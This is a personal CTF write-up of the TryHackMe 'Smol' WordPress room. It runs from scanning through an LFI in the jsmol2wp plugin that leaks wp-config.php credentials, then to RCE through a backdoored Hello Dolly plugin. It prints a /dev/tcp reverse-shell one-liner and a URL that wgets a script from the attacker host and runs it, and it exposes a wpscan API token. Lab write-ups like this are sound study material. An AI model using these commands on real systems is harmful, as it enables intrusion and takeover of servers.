---
title: Smol
difficulty: Medium
platform: THM
tags:
tools:
date: 2026-03-03
---
![](../THM%20Challenge%20Rooms%20-%20Red%20Easy/Obsidian%20assets/Smol-3.png)

> [!important]
> At the heart of **Smol** is a WordPress website, a common target due to its extensive plugin ecosystem. 
> 
> The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. 
> 
> Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.
> 
> Target IP Address: 10.114.165.225
> 
> What is the user flag?

> [!info]
> OK, first medium THM room, let's start with enumeration as always.

```
> sudo nmap -p- -A -O -sVC www.smol.thm
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-03 12:51 +0000
Nmap scan report for www.smol.thm (10.114.165.225)
Host is up (0.022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9e:da:82:29:3f:ce:c1:86:57:2c:1e:c2:1d:ac:9f:bc (RSA)
|   256 4a:40:6d:19:f7:19:97:c0:5c:13:71:01:83:c3:d2:17 (ECDSA)
|_  256 0c:ce:2d:62:11:c2:00:8b:ee:70:41:19:f0:bf:f0:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: AnotherCTF
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 6.7.1
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=3/3%OT=22%CT=1%CU=39188%PV=Y%DS=3%DC=T%G=Y%TM=69A6D995
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=107%GCD=1%ISR=106%TI=Z%TS=A)SEQ(SP=FD%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS
OS:=A)SEQ(SP=FD%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FE%GCD=1%ISR=108%T
OS:I=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8NNT11NW7%O4=
OS:M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4
OS:B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%CC=Y%Q=)T1(R=Y%
OS:DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T4(R=Y%DF=Y%T=40%W=
OS:0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)T7(R=Y%D
OS:F=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL
OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   18.78 ms 192.168.128.1
2   ...
3   20.30 ms www.smol.thm (10.114.165.225)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.90 seconds
```

> [!note]
> Only two ports opened and had to add www.smol.thm to the /etc/hosts file.

```
> searchsploit 6.7.1
-------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                              |  Path
-------------------------------------------------------------------------------------------- ---------------------------------
AnyDVD 6.7.1.0 - Denial of Service                                                          | windows_x86/dos/15306.pl
Cisco Firepower Management Center < 6.6.7.1 - Authenticated RCE                             | hardware/webapps/51881.py
Man-db 2.6.7.1 - Local Privilege Escalation                                                 | linux/local/41158.md
McAfee Email Gateway 6.7.1 - 'systemWebAdminConfig.do' Remote Security Bypass               | windows/remote/34013.txt
MedDream PACS Server Premium 6.7.1.1 - 'email' SQL Injection                                | php/webapps/45344.txt
PHPCompta/NOALYSS 6.7.1 5638 - Remote Command Execution                                     | php/webapps/34861.txt
Softneta MedDream PACS Server Premium 6.7.1.1 - Directory Traversal                         | php/webapps/45347.txt
SolarWinds Kiwi Syslog Server 9.6.7.1 - Unquoted Service Path                               | windows/local/52064.txt
WordPress Theme Newspaper 6.7.1 - Privilege Escalation                                      | php/webapps/39894.php
-------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

> [!note]
> While awaiting gobuster web directory enumeration - I decided to look up wordpress 6.7.1 vulnerabilities and saw on searchsploit and exploit DB https://www.exploit-db.com/exploits/39894 paths for PE further into the pen test so I'll keep it aside for now.

```
> gobuster dir -u http://www.smol.thm/  -w /usr/share/wordlists/dirbuster-big.txt  -t 40
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://www.smol.thm/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
wp-content           (Status: 301) [Size: 317] [--> http://www.smol.thm/wp-content/]
wp-includes          (Status: 301) [Size: 318] [--> http://www.smol.thm/wp-includes/]
wp-admin             (Status: 301) [Size: 315] [--> http://www.smol.thm/wp-admin/]
server-status        (Status: 403) [Size: 277]
Progress: 1185252 / 1185252 (100.00%)
===============================================================
Finished
===============================================================
```

> [!note]
> ran gobuster with access to 3 web dirs - wp-content didn't reveal anything, just a white page. 
> wp-includes revealed a lot of dirs which from the start information would lead me to believe one of the plugins in vulnerable for me to get the initial foothold but I will continue to enumerate for now.

![](../THM%20Challenge%20Rooms%20-%20Red%20Easy/Obsidian%20assets/Smolwp-includes.png)
> [!note]
> Ok interesting I think - the wp-admin page changed the URL into http://www.smol.thm/wp-login.php?redirect_to=http%3A%2F%2Fwww.smol.thm%2Fwp-admin%2F&reauth=1

> [!info]
> Learnt to use wpscan with apitoken which is specific to word press for automating scan to find vuln information:

```
[+] Elapsed time: 00:00:20
 ~                                                                                                    took 23s | at 17:31:50
> wpscan --url http://www.smol.thm --api-token 9P3ub5jnWnDFhkle2xNzmtAHdIUnITwj685IwqDiGpc -e
 ~                                                                                                         INT | at 17:32:10
> wpscan --url http://www.smol.thm -e u,vp,vt --plugins-detection aggressive --api-token 9P3ub5jnWnDFhkle2xNzmtAHdIUnITwj685Iw
WARNING: Nokogiri was built against libxml version 2.14.2, but has dynamically loaded 2.15.1
WARNING: Nokogiri was built against libxslt version 1.1.43, but has dynamically loaded 1.1.45
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the def
You can add reline to your Gemfile or gemspec to silence this warning.
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://www.smol.thm/ [10.112.173.1]
[+] Started: Tue Mar  3 17:32:27 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://www.smol.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://www.smol.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://www.smol.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://www.smol.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Insecure, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://www.smol.thm/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
 |  - http://www.smol.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     Fixed in: 6.7.4
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cros
 |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     Fixed in: 6.7.4
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sens
 |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/

[+] WordPress theme in use: twentytwentythree
 | Location: http://www.smol.thm/wp-content/themes/twentytwentythree/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://www.smol.thm/wp-content/themes/twentytwentythree/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | [!] Directory listing is enabled
 | Style URL: http://www.smol.thm/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.2'

[+] Enumerating Vulnerable Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:00:31 <============================================> (7343 / 7343) 100.00% Time: 00:00:31
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 | Readme: http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/, status: 200
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: JSmol2WP <= 1.07 - Unauthenticated Cross-Site Scripting (XSS)
 |     References:
 |      - https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20462
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 |
 | [!] Title: JSmol2WP <= 1.07 - Unauthenticated Server Side Request Forgery (SSRF)
 |     References:
 |      - https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20463
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:02 <==============================================> (652 / 652) 100.00% Time: 00:00:02
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] Jose Mario Llado Marti
 | Found By: Rss Generator (Passive Detection)

[+] wordpress user
 | Found By: Rss Generator (Passive Detection)

[+] admin
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] think
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] wp
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] diego
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] gege
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] xavi
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 1
 | Requests Remaining: 21

[+] Finished: Tue Mar  3 17:33:06 2026
[+] Requests Done: 8023
[+] Cached Requests: 60
[+] Data Sent: 2.134 MB
[+] Data Received: 1.126 MB
[+] Memory used: 295.363 MB
[+] Elapsed time: 00:00:38
 ~
```

> [!note]
> Okay found the attack surface to explore which is jsmol2wp version 1.07 and found a number of usernames. The vulns is cross-site scripting (XSS) & server-side request forgery (SSRF). Let's see which one gets us in.

```
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

> [!note]
> From wpscan - it led me to this link https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/ which led me to a LFI exploit to get a DB password it seems: http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php as shown above.

![](../THM%20Challenge%20Rooms%20-%20Red%20Easy/Obsidian%20assets/Smolim%20in.png)

![](../THM%20Challenge%20Rooms%20-%20Red%20Easy/Obsidian%20assets/Smolim%20inn.png)

> [!note]
> Ok, I'm in but lets enumerate what we can find here now.

![](../THM%20Challenge%20Rooms%20-%20Red%20Easy/Obsidian%20assets/Smolprivvate%20file.png)

> [!note]
> After checking if file upload was possible, I found a private file which mentions the hello dolly plugin that can lead to backdoor access.

![](../THM%20Challenge%20Rooms%20-%20Red%20Easy/Obsidian%20assets/Smolhello%20dolly.png)

> [!note]
> ok found the right directory traversal path to hello.php which leads to RCE

![](../THM%20Challenge%20Rooms%20-%20Red%20Easy/Obsidian%20assets/Smolbase64.png)

![](../THM%20Challenge%20Rooms%20-%20Red%20Easy/Obsidian%20assets/Smolbase64%20decoded.png)

> [!note]
>Because im logged in as admin, hello dolly and the PHP code above, I can execute RCE in the URL via GET parameter as shown below screenshot:

![](../THM%20Challenge%20Rooms%20-%20Red%20Easy/Obsidian%20assets/Smolwhoami.png)

> [!note]
> Took a little while to figure this out but got there in the end.
> First create a txt file for the rev shell called webshell.sh and got a little help generating the script for it with rev shell generator and AI: sh -i >& /dev/tcp/192.168.148.210/4444 0>&1 which was then piped into bash to activate the cmd.
> 
> python3 -m http.server 8000 was used to send the file locally from my PC to smol.thm via the custom url: http://www.smol.thm/wp-admin/index.php?cmd=wget%20http://192.168.148.210:8000/webshell.sh%20-O%20/tmp/w.sh%3Bbash%20/tmp/w.sh

```
> nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.112.173.1 41032
sh: 0: can't access tty; job control turned off
$ whoami
www-data
```



